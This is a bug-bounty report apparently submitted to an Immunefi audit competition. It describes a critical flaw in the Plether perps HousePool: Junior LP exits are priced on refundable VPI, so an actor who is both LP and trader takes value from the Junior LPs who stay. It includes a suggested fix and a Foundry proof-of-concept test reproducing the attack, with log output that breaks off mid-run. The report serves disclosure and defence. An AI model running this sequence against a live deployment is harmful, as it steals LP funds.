# \#98287 [SC-Critical] Junior exit is priced on refundable VPI so an LP who also trades takes value from the Junior LPs who stay

**Submitted on Nov 6th 2026 at 18:18:39 UTC by @tchoupilou for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #98287
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/blob/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src/HousePool.sol
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

A skew-increasing open pays positive VPI into HousePool. The next LP epoch settlement credits that cash to Junior principal and prices the Junior exits of that settlement on it. Closing the same position refunds the VPI to the trader. A Junior LP that exits between the open and the close is paid part of a charge that is later refunded, and the Junior LPs who hold at the close pay for it. One unprivileged actor can hold both roles. SECURITY.md:858-859 promises the opposite: "new LPs receive the same marked-liability discount borne by existing LPs and do not inherit old trader obligations at a higher deposit NAV".

## Vulnerability Details

The open sends the trade cost net of the protocol fee to `HousePool.recordClaimantInflow` as `Revenue` with `CashArrived` (`CfdEngineSettlementSidecar.sol:454-460`), which adds it to `accountedAssets` (`HousePool.sol:640-641`). `_reconcile` routes it to the tranches before redemptions are funded (`HousePool.sol:1558-1590`), so the Junior exit of that epoch is paid on a principal that includes it.

The VPI is a potential, the difference C(S_post) minus C(S_pre) of a curve in skew (WHITEPAPER 5.1). A close that brings the skew back refunds it, through the curve at equal depth or through the lifetime clamp at lower depth (`CloseAccountingLib.sol:107-118`), paid from pool cash (`CfdEnginePlanLib.sol:973-977`). Nothing in the Junior NAV accounts for that refund. ACCOUNTING_SPEC.md:1064-1066 keeps anticipated VPI outside terminal `K` but the VPI already received sits in pool cash and in Junior principal.

The AI scan entry "Temporary pool-liquidity reduction can amplify a skew-reducing close rebate" (scan-plether-fi-plether-core-d4541b49.md:1742) is a different mechanism: a depth drop enlarges the rebate beyond the curve. Here the loss does not need any depth change. In `test_attack_depthRestoredBeforeClose` an honest LP deposits 7.5M Junior after the exit, the close runs at 2,205.50 USDG more pool assets than the open, about 0.01%, and the Junior holders still lose 5,056.68 USDG.

### Attack

1. The attacker holds Junior shares and calls `TrancheVault.requestRedeem` for all of them.
2. After the redeem epoch matures and before it settles, the attacker's trader account commits a skew-increasing open and a keeper executes it.
3. A keeper calls `OrderRouter.settleLpEpoch`. The exit is priced with the VPI in Junior principal. The attacker calls `claimRedeem`.
4. The trader account closes. The VPI is refunded from pool cash, which the Junior holders at that time fund.

The exiting LP keeps its Junior fraction f of the VPI. With no prior skew an open at the 0.4 x depth limit pays VPI equal to 20 bps of its notional. The round trip costs 8 bps of execution fee and 4.5 bps of adverse confidence shift at the 9 bps Pyth confidence used in the PoC, so the run pays when f is above 62.5%, or 40% with zero confidence. Existing skew raises the VPI per unit of new notional up to 40 bps and lowers the threshold. The Junior exit is capped so the Junior keeps a quarter of Senior exposure (`HousePoolSeniorCapacityLib.sol:62-90` at 8000 bps), so an exit of fraction f needs Senior at most 4 x (1 - f) times the Junior.

The same root cause works on entry. A skew-reducing open receives a negative VPI rebate from pool cash, held in the trader's reserve outside LP equity, and the close claws it back into the pool. A Junior deposit settled in that window buys at the low NAV and takes part of the clawback (`test_mirror_juniorEntryBeforeVpiClawback`).

### Suggested fix

Count received VPI that a close can still refund as a pool liability until the position that paid it closes or is liquidated, and count a pending clawback as a pool asset, so Junior exits and entries are priced net of both.

## Impact Details

Junior LPs lose principal to an unprivileged actor who profits after every fee. Release parameters throughout: `vpiFactor` 0.01e18, `maxSkewRatio` 0.4e18, `initMarginBps` 20, `maintMarginBps` 10, `executionFeeBps` 4, `maxSeniorShareBps` 8000, `maxSeniorExposureAssets` 40M, `basketMaxConfidenceRatioBps` 10, `adverseConfidenceMultiplierBps` 2500. Unless stated, Junior 10M of which the attacker holds 7.5M, Senior 8M, constant basket of 1.20.

| test | Junior LPs | attacker net |
|---|---|---|
| exit + open/close against the same exit alone | victim minus 5,078.06 | plus 2,344.47 |
| same, depth restored by a newcomer before the close | holders at the close minus 5,056.68 (newcomer minus 6,513.89) | plus 2,320.49 |
| three consecutive epochs, proceeds redeposited | victim minus 5,077.97, 10,162.26, 15,252.86 cumulative | plus 7,052.20 |
| entry before a VPI clawback (victim Junior 2.5M, attacker deposits 7.5M, honest LONG of 4.08M) | victim minus 4,786.35 | plus 1,524.04 |

In the first test the open pays 12,988.71 USDG of VPI and the attacker's exit receives 10,894.68 USDG more than the same exit without the trade. The trader pays 8,550.21 USDG of fees, carry and adverse execution. The treasury is credited 2,735.38 USDG, the close fee and the confidence shift stay in the pool, and Senior moves by 0.04 USDG. The same open and close without the exit leave the victim 1,453.50 USDG better off, so the loss comes from the exit priced on the refundable VPI. The loss grows linearly with each epoch the sequence is repeated.

## References

- `packages/perps/src/CfdEngineSettlementSidecar.sol:454-460`
- `packages/perps/src/HousePool.sol:640-641` and `:1558-1590`
- `packages/perps/src/libraries/CloseAccountingLib.sol:107-118`
- `packages/perps/src/libraries/CfdEnginePlanLib.sol:973-977`
- `packages/perps/src/libraries/HousePoolSeniorCapacityLib.sol:62-90`
- `packages/perps/SECURITY.md:858-859`
- `packages/perps/ACCOUNTING_SPEC.md:1064-1066`
- `packages/perps/WHITEPAPER.md` section 5.1
- `packages/perps/DEPLOYMENT.md:123-156`


## Proof of Concept

Save the file as `packages/perps/test/perps/VpiNavJuniorExit.t.sol` and run:

```
forge test --root packages/perps --match-path test/perps/VpiNavJuniorExit.t.sol -vv
```

LPs and traders use only public entrypoints and the keeper is an ordinary address. `BasePerpTest.setUp` deploys and seeds the stack. This file then installs the release pool caps as owner and the release oracle confidence policy through `PletherOracle.applyConfig` called as the Router. Each test compares the attack with a control from the same snapshot that differs only by the attacker's trade.

```solidity
// SPDX-License-Identifier: AGPL-3.0
// vm.getBlockTimestamp() throughout: under via-IR `block.timestamp` is cached inside a test function after vm.warp.
pragma solidity 0.8.35;

import {BasePerpTest} from "./BasePerpTest.sol";

import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {IHousePool} from "@plether/perps/interfaces/IHousePool.sol";
import {IPletherOracle} from "@plether/perps/interfaces/IPletherOracle.sol";
import {SafeCast} from "@openzeppelin/contracts/utils/math/SafeCast.sol";
import {console} from "forge-std/console.sol";

/// @notice Positive VPI paid by a skew-increasing open is added to Junior principal at the next LP epoch settlement
///         and the Junior exit of that settlement is priced on it. When the same position closes, the VPI curve
///         refunds the same amount to the trader. A Junior LP that exits in between takes its pro-rata share of a
///         charge that is later paid back, and the Junior LPs that hold at the close fund it.
///
///         One attacker controls a Junior LP address and a trader address. Every step uses production entrypoints:
///         `TrancheVault.requestDeposit/claimDeposit/requestRedeem/claimRedeem`, `OrderRouter.commitOrder`, and an
///         unprivileged keeper calling `OrderRouter.executeOrder`, `OrderRouter.updateMarkPrice` and
///         `OrderRouter.settleLpEpoch` with Pyth update data. The owner only installs the release pool caps in setUp.
///         Risk parameters and pool caps are the release values of DEPLOYMENT.md. The basket stays at 1.20 for the
///         whole run, so nobody has price PnL.
contract VpiNavJuniorExitTest is BasePerpTest {

    address internal attackerLp = makeAddr("attackerLp");
    address internal attackerTrader = makeAddr("attackerTrader");
    address internal honestTrader = makeAddr("honestTrader");
    address internal victimLp = makeAddr("victimLp");
    address internal seniorLp = makeAddr("seniorLp");
    address internal newcomerLp = makeAddr("newcomerLp");
    address internal keeper = makeAddr("keeper");

    uint256 internal constant PRICE = 1.2e8;
    uint256 internal constant MARGIN = 100_000e6;
    /// @dev Pyth confidence on every update of this file, just under the 10 bps basket maximum the release oracle
    ///      accepts (DEPLOYMENT.md basketMaxConfidenceRatioBps). With the release adverse multiplier of 2500 bps every
    ///      execution is shifted against the trader by 2.25 bps, the worst case for the attacker.
    uint256 internal constant PYTH_CONF_BPS = 9;

    uint256 internal clientNonce;
    address internal activeTrader;

    struct Outcome {
        uint256 victimAssets;
        uint256 newcomerAssets;
        uint256 attackerLpReceived;
        uint256 attackerTraderBefore;
        uint256 attackerTraderAfter;
        int256 vpiAccrued;
        uint256 poolAssetsAtOpen;
        uint256 poolAssetsAtClose;
        uint256 seniorAssets;
        uint256 treasuryCredit;
    }

    // ---------------------------------------------------------------- release configuration

    function _riskParams() internal pure override returns (CfdTypes.RiskParams memory) {
        return CfdTypes.RiskParams({
            vpiFactor: 0.01e18,
            maxSkewRatio: 0.4e18,
            maintMarginBps: 10,
            initMarginBps: 20,
            fadMarginBps: 300,
            baseCarryBps: 500,
            minBountyAssets: 1e6,
            bountyBps: 10,
            keeperShareBps: 5000,
            protocolShareBps: 0
        });
    }

    function _initialJuniorDeposit() internal pure override returns (uint256) {
        return 0;
    }

    function setUp() public override {
        super.setUp();

        // Release pool caps (DEPLOYMENT.md): 40M USDG Senior exposure, 8000 bps Senior share.
        IHousePool.PoolConfig memory config = _currentPoolConfig();
        config.maxSeniorExposureAssets = 40_000_000e6;
        config.maxSeniorShareBps = 8000;
        pool.proposePoolConfig(config);
        vm.warp(pool.poolConfigActivationTime());
        pool.finalizePoolConfig();
        vm.warp(SETUP_TIMESTAMP);

        // Release oracle confidence policy (DEPLOYMENT.md: basketMaxConfidenceRatioBps 10, adverseConfidenceMultiplierBps
        // 2500). applyConfig is the call the Router makes when its timelocked oracle config is finalized.
        IPletherOracle.OracleConfig memory oracleConfig = IPletherOracle.OracleConfig({
            orderExecutionStalenessLimit: pletherOracle.orderExecutionStalenessLimit(),
            liquidationStalenessLimit: pletherOracle.liquidationStalenessLimit(),
            basketMaxConfidenceRatioBps: 10,
            orderSettlementWindow: pletherOracle.orderSettlementWindow(),
            maxComponentPublishTimeDivergence: pletherOracle.maxComponentPublishTimeDivergence(),
            adverseConfidenceMultiplierBps: 2500
        });
        vm.prank(address(router));
        pletherOracle.applyConfig(oracleConfig);

        _fundTrader(attackerTrader, 200_000e6);
        _fundTrader(honestTrader, 200_000e6);
        assertEq(pool.maxSeniorShareBps(), 8000, "release senior share cap");
        assertEq(engine.executionFeeBps(), 4, "release execution fee");
        assertEq(pletherOracle.adverseConfidenceMultiplierBps(), 2500, "release adverse confidence multiplier");
        assertEq(pletherOracle.basketMaxConfidenceRatioBps(), 10, "release basket confidence ratio");
    }

    /// @dev Same as BasePerpTest._mockPythUpdateData, with a nonzero confidence on every feed.
    function _pyth(
        uint256 price
    ) internal returns (bytes[] memory updateData) {
        vm.roll(vm.getBlockNumber() + 1);
        vm.warp(vm.getBlockTimestamp() + 1);
        uint256 publishTime = _mockHistoricalPublishTime();
        baseMockPyth.setAllUniquePrices(
            _basePythFeedIds(),
            SafeCast.toInt64(SafeCast.toInt256(price)),
            SafeCast.toUint64(price * PYTH_CONF_BPS / 10_000),
            int32(-8),
            publishTime,
            publishTime == 0 ? 0 : publishTime - 1
        );
        updateData = new bytes[](1);
        updateData[0] = abi.encode(price);
    }

    /// @dev LPs enter through the public async path. Junior first, Senior capacity is a multiple of Junior. Then the
    ///      1 h deposit cooldown is cleared and the constant 1.20 basket is installed while the book is empty.
    function _setupLps(
        uint256 attackerJunior,
        uint256 victimJunior,
        uint256 senior
    ) internal {
        uint256 attackerReq = _requestDeposit(attackerLp, attackerJunior, false);
        uint256 victimReq = _requestDeposit(victimLp, victimJunior, false);
        _warpTo(juniorVault.depositEpochStart(attackerReq));
        _settleAsKeeper(1e8);
        _claimDeposit(attackerLp, attackerReq, false);
        _claimDeposit(victimLp, victimReq, false);

        uint256 seniorReq = _requestDeposit(seniorLp, senior, true);
        _warpTo(seniorVault.depositEpochStart(seniorReq));
        _settleAsKeeper(1e8);
        _claimDeposit(seniorLp, seniorReq, true);

        vm.warp(vm.getBlockTimestamp() + 1 hours + 60);
        _refreshMark(PRICE);
    }

    // ---------------------------------------------------------------- production entrypoints

    function _requestDeposit(
        address lp,
        uint256 amount,
        bool senior
    ) internal returns (uint256 requestId) {
        settlementToken.mint(lp, amount);
        vm.startPrank(lp);
        if (senior) {
            settlementToken.approve(address(seniorVault), amount);
            requestId = seniorVault.requestDeposit(amount, lp, lp);
        } else {
            settlementToken.approve(address(juniorVault), amount);
            requestId = juniorVault.requestDeposit(amount, lp, lp);
        }
        vm.stopPrank();
    }

    function _claimDeposit(
        address lp,
        uint256 requestId,
        bool senior
    ) internal {
        vm.startPrank(lp);
        if (senior) {
            uint256 claimable = seniorVault.claimableDepositRequest(requestId, lp);
            seniorVault.claimDeposit(requestId, claimable, lp, lp);
        } else {
            uint256 claimable = juniorVault.claimableDepositRequest(requestId, lp);
            juniorVault.claimDeposit(requestId, claimable, lp, lp);
        }
        vm.stopPrank();
    }

    function _warpTo(
        uint256 timestamp
    ) internal {
        if (vm.getBlockTimestamp() < timestamp) {
            vm.warp(timestamp);
        }
    }

    function _settleAsKeeper(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _pyth(price);
        vm.prank(keeper);
        router.settleLpEpoch(pythUpdate);
    }

    /// @dev Used where no LP request matured: HousePool reverts HousePool__NoLpEpochProgress, which is logged.
    function _trySettleAsKeeper(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _pyth(price);
        vm.prank(keeper);
        try router.settleLpEpoch(pythUpdate) {
            console.log("  settleLpEpoch: progressed");
        } catch {
            console.log("  settleLpEpoch: no matured LP epoch, nothing to settle");
        }
    }

    function _refreshMark(
        uint256 price
    ) internal {
        bytes[] memory pythUpdate = _pyth(price);
        vm.prank(keeper);
        router.updateMarkPrice(pythUpdate);
    }

    function _request(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal returns (OrderV3Types.OrderRequest memory request) {
        uint256 window = router.maxExecutionWindowSeconds();
        request = OrderV3Types.OrderRequest({
            clientOrderId: keccak256(abi.encode("vpi-nav-junior-exit", ++clientNonce)),
            side: side,
            sizeDelta: size,
            marginDelta: margin,
            targetPrice: (side == CfdTypes.Side.LONG) == isClose ? type(uint256).max : 1,
            isClose: isClose,
            bounds: OrderV3Types.ExecutionBounds({
                submitBy: uint64(vm.getBlockTimestamp() + window),
                executionWindowSeconds: uint32(window),
                allowedExecutionModes: 7,
                expectedConfigHash: router.lifecycleBook().currentExecutionConfigHash(),
                maxExecutionBountyAssets: type(uint256).max,
                maxExecutionNotionalAssets: type(uint256).max,
                maxGrossAccountDebitAssets: type(uint256).max,
                maxActionChargeAssets: type(uint256).max,
                maxExplicitFeesAssets: type(uint256).max,
                maxPostPositionSize: type(uint256).max,
                minPostSettlementBalanceAssets: 0,
                minPostPositionEquityAssets: 0,
                maxPostLeverageBps: type(uint32).max
            })
        });
    }

    function _tradeExecuted(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        OrderV3Types.OrderRequest memory request = _request(side, size, margin, isClose);
        vm.prank(activeTrader);
        uint64 orderId = router.commitOrder(request);
        bytes[] memory pythUpdate = _pyth(PRICE);
        vm.prank(keeper);
        OrderV3Types.ExecutionResult memory result = router.executeOrder(orderId, pythUpdate);
        assertEq(uint8(result.status), uint8(OrderV3Types.LifecycleStatus.Executed), "order must execute");
    }

    function _vpiAccrued() internal view returns (int256 vpi) {
        (,,,,,, vpi) = engine.positions(attackerTrader);
    }

    function _attackerTrade(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        activeTrader = attackerTrader;
        _tradeExecuted(side, size, margin, isClose);
    }

    function _honestTrade(
        CfdTypes.Side side,
        uint256 size,
        uint256 margin,
        bool isClose
    ) internal {
        activeTrader = honestTrader;
        _tradeExecuted(side, size, margin, isClose);
    }

    function _positionSize() internal view returns (uint256 size) {
        (size,,,,,,) = engine.positions(attackerTrader);
    }

    /// @dev Requests a full Junior exit for `lp`, lets the epoch mature, runs `trade` around the settlement and
    ///      returns the USDG received by `lp`.
    function _exitAround(
        uint256 tradeSize,
        bool exit
    ) internal returns (uint256 received, int256 vpi) {
        uint256 redeemId;
        uint256 redeemShares;
        if (exit) {
            redeemShares = juniorVault.balanceOf(attackerLp);
            vm.prank(attackerLp);
            redeemId = juniorVault.requestRedeem(redeemShares, attackerLp, attackerLp);
        }
        vm.warp(vm.getBlockTimestamp() + 1 hours + 60);
        _refreshMark(PRICE);
        if (tradeSize != 0) {
            _attackerTrade(CfdTypes.Side.LONG, tradeSize, MARGIN, false);
            vpi = _vpiAccrued();
        }
        if (exit) {
            _settleAsKeeper(PRICE);
            uint256 claimable = juniorVault.claimableRedeemRequest(redeemId, attackerLp);
            assertEq(claimable, redeemShares, "the whole Junior exit was funded at this settlement");
            uint256 before = settlementToken.balanceOf(attackerLp);
            vm.prank(attackerLp);
            juniorVault.claimRedeem(redeemId, claimable, attackerLp, attackerLp);
            received = settlementToken.balanceOf(attackerLp) - before;
        } else {
            _trySettleAsKeeper(PRICE);
        }
    }

    function _juniorAssetsOf(
        address lp
    ) internal view returns (uint256) {
        return juniorVault.convertToAssets(juniorVault.balanceOf(lp));
    }

    // ---------------------------------------------------------------- scenario

    /// @param tradeSize attacker trader opens this size before the exit settlement and closes it after (0 = no trade)
    /// @param exit      the attacker LP redeems all its Junior at that settlement
    /// @param restore   an honest newcomer deposits 7.5M Junior after the exit and before the close
    function _run(
        uint256 tradeSize,
        bool exit,
        bool restore
    ) internal returns (Outcome memory o) {
        o.attackerTraderBefore = clearinghouse.balanceAssets(attackerTrader);
        uint256 treasuryBefore = clearinghouse.balanceAssets(engine.protocolTreasury());
        if (tradeSize != 0) {
            o.poolAssetsAtOpen = pool.totalAssets();
        }
        (o.attackerLpReceived, o.vpiAccrued) = _exitAround(tradeSize, exit);

        if (restore) {
            uint256 depositId = _requestDeposit(newcomerLp, 7_500_000e6, false);
            _warpTo(juniorVault.depositEpochStart(depositId));
            _settleAsKeeper(PRICE);
            _claimDeposit(newcomerLp, depositId, false);
        }

        if (tradeSize != 0) {
            o.poolAssetsAtClose = pool.totalAssets();
            _attackerTrade(CfdTypes.Side.LONG, tradeSize, 0, true);
            assertEq(_positionSize(), 0, "position fully closed");
        }

        // TrancheVault.totalAssets reads HousePool.getPendingTrancheState, which books the close without a settlement
        // only while the mark is fresh (HousePool._markIsFreshForReconcile), so a keeper refreshes it before reading.
        vm.warp(vm.getBlockTimestamp() + 10 minutes);
        _refreshMark(PRICE);
        o.attackerTraderAfter = clearinghouse.balanceAssets(attackerTrader);
        o.victimAssets = _juniorAssetsOf(victimLp);
        o.newcomerAssets = _juniorAssetsOf(newcomerLp);
        o.seniorAssets = seniorVault.convertToAssets(seniorVault.balanceOf(seniorLp));
        o.treasuryCredit = clearinghouse.balanceAssets(engine.protocolTreasury()) - treasuryBefore;
    }

    function _log(
        string memory label,
        Outcome memory o
    ) internal pure {
        console.log(label);
        console.log("  VPI paid at open              ", uint256(o.vpiAccrued));
        console.log("  victim Junior assets          ", o.victimAssets);
        console.log("  newcomer Junior assets        ", o.newcomerAssets);
        console.log("  attacker LP USDG received     ", o.attackerLpReceived);
        console.log("  attacker trader balance before", o.attackerTraderBefore);
        console.log("  attacker trader balance after ", o.attackerTraderAfter);
        console.log("  pool totalAssets at open      ", o.poolAssetsAtOpen);
        console.log("  pool totalAssets at close     ", o.poolAssetsAtClose);
        console.log("  senior LP assets              ", o.seniorAssets);
        console.log("  treasury credit               ", o.treasuryCredit);
    }

    function _attackerWealth() internal view returns (uint256) {
        return _juniorAssetsOf(attackerLp) + settlementToken.balanceOf(attackerLp)
            + clearinghouse.balanceAssets(attackerTrader);
    }

    /// @dev The attacker puts the USDG it received back into the Junior through the public async path.
    function _redeposit(
        uint256 amount
    ) internal {
        vm.startPrank(attackerLp);
        settlementToken.approve(address(juniorVault), amount);
        uint256 requestId = juniorVault.requestDeposit(amount, attackerLp, attackerLp);
        vm.stopPrank();
        _warpTo(juniorVault.depositEpochStart(requestId));
        _settleAsKeeper(PRICE);
        _claimDeposit(attackerLp, requestId, false);
        vm.warp(vm.getBlockTimestamp() + 1 hours + 60);
        _refreshMark(PRICE);
    }

    // ---------------------------------------------------------------- tests

    /// @notice A vs C1 differ ONLY by the attacker's open and close. C2 vs C0 shows the trade alone does not hurt the
    ///         Junior that stays. The loss of the victim and the gain of the attacker exist only when both are combined.
    function test_attack_juniorExitTakesRefundableVpi() public {
        _setupLps(7_500_000e6, 2_500_000e6, 8_000_000e6);
        uint256 size = 57_000e20; // 6.84M notional at 1.20, under 0.4 x 18M skew limit
        uint256 snap = vm.snapshotState();
        Outcome memory a = _run(size, true, false);
        _log("== A  attack: Junior exit + open/close ==", a);
        vm.revertToState(snap);

        snap = vm.snapshotState();
        Outcome memory c1 = _run(0, true, false);
        _log("== C1 control: same Junior exit, no trade ==", c1);
        vm.revertToState(snap);

        snap = vm.snapshotState();
        Outcome memory c2 = _run(size, false, false);
        _log("== C2 control: same open/close, no exit ==", c2);
        vm.revertToState(snap);

        Outcome memory c0 = _run(0, false, false);
        _log("== C0 control: nothing ==", c0);

        int256 victimLoss = int256(c1.victimAssets) - int256(a.victimAssets);
        int256 attackerLpGain = int256(a.attackerLpReceived) - int256(c1.attackerLpReceived);
        int256 attackerCost = int256(a.attackerTraderBefore) - int256(a.attackerTraderAfter);
        int256 tradeOnlyEffect = int256(c2.victimAssets) - int256(c0.victimAssets);

        console.log("== RESULT ==");
        console.log("  victim Junior loss (A vs C1)         ", victimLoss);
        console.log("  attacker LP extra USDG (A vs C1)     ", attackerLpGain);
        console.log("  attacker trading cost                ", attackerCost);
        console.log("  attacker NET profit                  ", attackerLpGain - attackerCost);
        console.log("  victim delta from trade alone (C2-C0)", tradeOnlyEffect);
        console.log("  senior LP delta (A vs C1)            ", int256(a.seniorAssets) - int256(c1.seniorAssets));
        console.log("  treasury credit in A                 ", a.treasuryCredit);

        assertGt(a.vpiAccrued, 0, "open paid positive VPI");
        assertGt(victimLoss, 0, "victim Junior lost value");
        assertGt(attackerLpGain - attackerCost, 0, "attacker profit net of every fee");
        assertGe(tradeOnlyEffect, 0, "the trade alone does not hurt the staying Junior");
    }

    /// @notice Same attack, but an honest newcomer restores Junior depth before the close. The close runs at the same
    ///         pool depth as the open, so the curve itself refunds what was paid. Junior holders at the close still lose.
    function test_attack_depthRestoredBeforeClose() public {
        _setupLps(7_500_000e6, 2_500_000e6, 8_000_000e6);
        uint256 size = 57_000e20;
        uint256 snap = vm.snapshotState();
        Outcome memory d = _run(size, true, true);
        _log("== D  attack, depth restored by a newcomer before the close ==", d);
        vm.revertToState(snap);
        Outcome memory dc = _run(0, true, true);
        _log("== DC control: same exit and same newcomer, no trade ==", dc);

        int256 holdersLoss =
            int256(dc.victimAssets + dc.newcomerAssets) - int256(d.victimAssets + d.newcomerAssets);
        int256 attackerNet = (int256(d.attackerLpReceived) - int256(dc.attackerLpReceived))
            - (int256(d.attackerTraderBefore) - int256(d.attackerTraderAfter));
        int256 depthDrift = int256(d.poolAssetsAtClose) - int256(d.poolAssetsAtOpen);

        console.log("== RESULT depth restored ==");
        console.log("  pool depth at close minus at open    ", depthDrift);
        console.log("  loss of Junior holders at the close  ", holdersLoss);
        console.log("  newcomer loss                        ", int256(dc.newcomerAssets) - int256(d.newcomerAssets));
        console.log("  attacker NET profit                  ", attackerNet);

        assertLt(depthDrift < 0 ? -depthDrift : depthDrift, int256(d.poolAssetsAtOpen / 200), "depth restored");
        assertGt(holdersLoss, 0, "Junior holders at the close lost value");
        assertGt(attackerNet, 0, "attacker profit with restored depth");
    }

    /// @notice The attacker puts the proceeds back into the Junior and repeats at the next epochs. Three cycles against
    ///         the same three exits and redeposits without the trade.
    function test_attack_repeatsEveryEpoch() public {
        _setupLps(7_500_000e6, 2_500_000e6, 8_000_000e6);
        uint256 size = 57_000e20;
        uint256 wealthStart = _attackerWealth();
        uint256 victimStart = _juniorAssetsOf(victimLp);

        uint256 snap = vm.snapshotState();
        uint256[3] memory victimAttack;
        for (uint256 i; i < 3; ++i) {
            (uint256 received,) = _exitAround(size, true);
            _attackerTrade(CfdTypes.Side.LONG, size, 0, true);
            assertEq(_positionSize(), 0, "position fully closed");
            _redeposit(received);
            victimAttack[i] = _juniorAssetsOf(victimLp);
        }
        uint256 wealthAttack = _attackerWealth();
        vm.revertToState(snap);

        uint256[3] memory victimControl;
        for (uint256 i; i < 3; ++i) {
            (uint256 received,) = _exitAround(0, true);
            _redeposit(received);
            victimControl[i] = _juniorAssetsOf(victimLp);
        }
        uint256 wealthControl = _attackerWealth();

        console.log("== RESULT three cycles ==");
        console.log("  victim Junior assets at start        ", victimStart);
        console.log("  attacker wealth at start             ", wealthStart);
        for (uint256 i; i < 3; ++i) {
            console.log("  cycle", i + 1);
            console.log("    victim Junior, attack              ", victimAttack[i]);
            console.log("    victim Junior, control             ", victimControl[i]);
            console.log("    victim cumulative loss             ", victimControl[i] - victimAttack[i]);
        }
        console.log("  attacker wealth, attack              ", wealthAttack);
        console.log("  attacker wealth, control             ", wealthControl);
        console.log("  attacker cumulative NET profit       ", int256(wealthAttack) - int256(wealthControl));

        assertGt(victimControl[0], victimAttack[0], "cycle 1 loss");
        assertGt(victimControl[1] - victimAttack[1], victimControl[0] - victimAttack[0], "loss grows at cycle 2");
        assertGt(victimControl[2] - victimAttack[2], victimControl[1] - victimAttack[1], "loss grows at cycle 3");
        assertGt(wealthAttack, wealthControl, "attacker cumulative profit");
    }

    /// @notice Mirror on the entry side. A skew-reducing open receives a negative VPI rebate from pool cash. The rebate
    ///         sits in the trader's VPI reserve, which is excluded from LP equity, so Junior NAV stays low until the
    ///         close claws it back. The attacker enters the Junior in that window and closes after the deposit
    ///         activates. An honest trader's LONG provides the existing skew in the attack and in the control.
    function test_mirror_juniorEntryBeforeVpiClawback() public {
        _setupLps(1_000e6, 2_500_000e6, 8_000_000e6);
        _honestTrade(CfdTypes.Side.LONG, 34_000e20, MARGIN, false); // 4.08M notional, under 0.4 x 10.5M
        uint256 deposit = 7_500_000e6;
        settlementToken.mint(attackerLp, deposit);
        uint256 victimBefore = _juniorAssetsOf(victimLp);

        uint256 snap = vm.snapshotState();
        uint256 traderBefore = clearinghouse.balanceAssets(attackerTrader);
        _attackerTrade(CfdTypes.Side.SHORT, 34_000e20, MARGIN, false);
        int256 rebate = _vpiAccrued();
        _redeposit(deposit);
        _attackerTrade(CfdTypes.Side.SHORT, 34_000e20, 0, true);
        assertEq(_positionSize(), 0, "position fully closed");
        vm.warp(vm.getBlockTimestamp() + 10 minutes);
        _refreshMark(PRICE);
        uint256 victimAttack = _juniorAssetsOf(victimLp);
        uint256 wealthAttack = _attackerWealth();
        uint256 traderCost = traderBefore - clearinghouse.balanceAssets(attackerTrader);
        vm.revertToState(snap);

        _redeposit(deposit);
        vm.warp(vm.getBlockTimestamp() + 10 minutes);
        _refreshMark(PRICE);
        uint256 victimControl = _juniorAssetsOf(victimLp);
        uint256 wealthControl = _attackerWealth();

        console.log("== RESULT mirror, Junior entry before the VPI clawback ==");
        console.log("  VPI accrued by the skew-reducing open", rebate);
        console.log("  victim Junior before                 ", victimBefore);
        console.log("  victim Junior, attack                ", victimAttack);
        console.log("  victim Junior, control               ", victimControl);
        console.log("  victim loss                          ", int256(victimControl) - int256(victimAttack));
        console.log("  attacker trading cost                ", traderCost);
        console.log("  attacker NET profit                  ", int256(wealthAttack) - int256(wealthControl));

        assertLt(rebate, 0, "the open received a VPI rebate");
        assertGt(victimControl, victimAttack, "victim Junior lost value");
        assertGt(wealthAttack, wealthControl, "attacker profit net of every fee");
    }

}
```

Output:

```
Ran 4 tests for test/perps/VpiNavJuniorExit.t.sol:VpiNavJuniorExitTest
[PASS] test_attack_depthRestoredBeforeClose() (gas: 9959349)
Logs:
  == D  attack, depth restored by a newcomer before the close ==
    VPI paid at open               12988709268
    victim Junior assets           2501346465611
    newcomer Junior assets         7493476959313
    attacker LP USDG received      7510783206448
    attacker trader balance before 200000000000
    attacker trader balance after  191425810713
    pool totalAssets at open       18002000000000
    pool totalAssets at close      18004205502820
    senior LP assets               8000231396874
    treasury credit                2735384400
  == DC control: same exit and same newcomer, no trade ==
    VPI paid at open               0
    victim Junior assets           2499889248705
    newcomer Junior assets         7499990851781
    attacker LP USDG received      7499888529178
    attacker trader balance before 200000000000
    attacker trader balance after  200000000000
    pool totalAssets at open       0
    pool totalAssets at close      0
    senior LP assets               8000231376580
    treasury credit                0
  == RESULT depth restored ==
    pool depth at close minus at open     2205502820
    loss of Junior holders at the close   5056675562
    newcomer loss                         6513892468
    attacker NET profit                   2320487983

[PASS] test_attack_juniorExitTakesRefundableVpi() (gas: 13214155)
Logs:
  == A  attack: Junior exit + open/close ==
    VPI paid at open               12988709268
    victim Junior assets           2494872589193
    newcomer Junior assets         0
    attacker LP USDG received      7510783206448
    attacker trader balance before 200000000000
    attacker trader balance after  191449789080
    pool totalAssets at open       18002000000000
    pool totalAssets at close      10504205502820
    senior LP assets               8000160852585
    treasury credit                2735384400
  == C1 control: same Junior exit, no trade ==
    VPI paid at open               0
    victim Junior assets           2499950649332
    newcomer Junior assets         0
    attacker LP USDG received      7499888529178
    attacker trader balance before 200000000000
    attacker trader balance after  200000000000
    pool totalAssets at open       0
    pool totalAssets at close      0
    senior LP assets               8000160811996
    treasury credit                0
    settleLpEpoch: no matured LP epoch, nothing to settle
  == C2 control: same open/close, no exit ==
    VPI paid at open               12988709268
    victim Junior assets           2501413294182
    newcomer Junior assets         0
    attacker LP USDG received      0
    attacker trader balance before 200000000000
    attacker trader balance after  191449791958
    pool totalAssets at open       18002000000000
    pool totalAssets at close      18014988709268
    senior LP assets               8000160852359
    treasury credit                2735384400
    settleLpEpoch: no matured LP epoch, nothing to settle
  == C0 control: nothing ==
    VPI paid at open               0
    victim Junior assets           2499959793769
    newcomer Junior assets         0
    attacker LP USDG received      0
    attacker trader balance before 200000000000
